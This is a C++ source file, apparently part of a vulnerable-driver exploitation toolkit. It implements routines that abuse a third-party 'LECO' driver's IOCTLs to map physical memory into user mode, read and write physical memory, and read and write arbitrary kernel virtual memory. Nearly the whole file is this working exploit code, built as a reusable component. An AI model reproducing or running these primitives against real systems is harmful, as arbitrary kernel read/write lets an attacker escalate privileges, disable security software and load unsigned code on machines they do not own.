/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2026
*
*  TITLE:       LECO.CPP
*
*  VERSION:     1.49
*
*  DATE:        10 Jun 2026
*
*  LECO LECOMA based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/leco.h"

/*
* LecoMapMemory
*
* Purpose:
*
* Map physical memory to the user mode.
*
*/
PVOID LecoMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    PVOID mappedVA = NULL;
    LECO_REQUEST request = { 0 };

    request.PhysAddr = PhysicalAddress;
    request.Key0 = 0;
    request.PoolType = 2;
    request.Size = NumberOfBytes;
    request.Key1 = 2;
    request.CacheFlags = 0;
    request.TypeDisc = 2;

    if (supCallDriver(DeviceHandle,
        IOCTL_LECO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &mappedVA,
        sizeof(mappedVA)))
    {
        return mappedVA;
    }

    return NULL;
}

/*
* LecoUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID LecoUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID MappedVa,
    _In_ ULONG_PTR Size)
{
    LECO_REQUEST request = { 0 };

    request.PhysAddr = (DWORD64)MappedVa;
    request.Key0 = 0;
    request.PoolType = 2;
    request.Size = (DWORD)Size;
    request.Key1 = 2;
    request.CacheFlags = 0;
    request.TypeDisc = 2;

    supCallDriver(DeviceHandle,
        IOCTL_LECO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* LecoVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI LecoVirtualToPhysical(
    HANDLE DeviceHandle,
    ULONG_PTR VirtualAddress,
    ULONG_PTR* PhysicalAddress)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
}

/*
* LecoReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI LecoReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedVA = NULL;
    ULONG_PTR pageBase, offset;
    ULONG_PTR mapSize;

    supCalcPhysMapParams(PhysicalAddress,
        NumberOfBytes,
        &pageBase,
        &offset,
        &mapSize);

    mappedVA = LecoMapMemory(DeviceHandle, pageBase, (ULONG)mapSize);
    if (mappedVA) {

        __try {

            RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedVA, offset), NumberOfBytes);
            bResult = TRUE;

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        LecoUnmapMemory(DeviceHandle, mappedVA, mapSize);
    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* LecoWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI LecoWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedVA = NULL;
    ULONG_PTR pageBase, offset;
    ULONG_PTR mapSize;

    supCalcPhysMapParams(PhysicalAddress,
        NumberOfBytes,
        &pageBase,
        &offset,
        &mapSize);

    mappedVA = LecoMapMemory(DeviceHandle, pageBase, (ULONG)mapSize);
    if (mappedVA) {

        __try {

            RtlCopyMemory(RtlOffsetToPointer(mappedVA, offset), Buffer, NumberOfBytes);
            bResult = TRUE;

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        LecoUnmapMemory(DeviceHandle, mappedVA, mapSize);
    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* LecoWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI LecoWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        LecoWritePhysicalMemory);
}

/*
* LecoReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI LecoReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        LecoReadPhysicalMemory);
}
